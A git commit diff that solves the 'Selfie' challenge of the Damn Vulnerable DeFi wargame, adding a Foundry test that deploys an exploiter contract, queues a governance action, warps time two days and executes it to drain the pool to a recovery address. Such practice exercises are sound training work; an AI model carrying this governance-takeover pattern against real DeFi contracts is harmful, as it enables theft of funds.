626653cb6f5f27a7fb78393092b2687bde11db08
Siddharth Patel <opensiddhu993@gmail.com>
2024-08-09 11:09:41 +0530

    solved 6: selfie

--- test/selfie/Selfie.t.sol
+++ test/selfie/Selfie.t.sol
@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {SelfieExploiter} from "./SelfieExploiter.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -61,8 +62,16 @@ contract SelfieChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_selfie() public checkSolvedByPlayer {
-        
+    function test_selfie() public checkSolvedByPlayer {   
+        SelfieExploiter exploiter = new SelfieExploiter(
+            address(pool),
+            address(governance),
+            address(token)
+        );
+
+        require(exploiter.exploitSetup(address(recovery)));
+        vm.warp(block.timestamp + 2 days);
+        require(exploiter.exploitCloseup());
     }
 
     /**
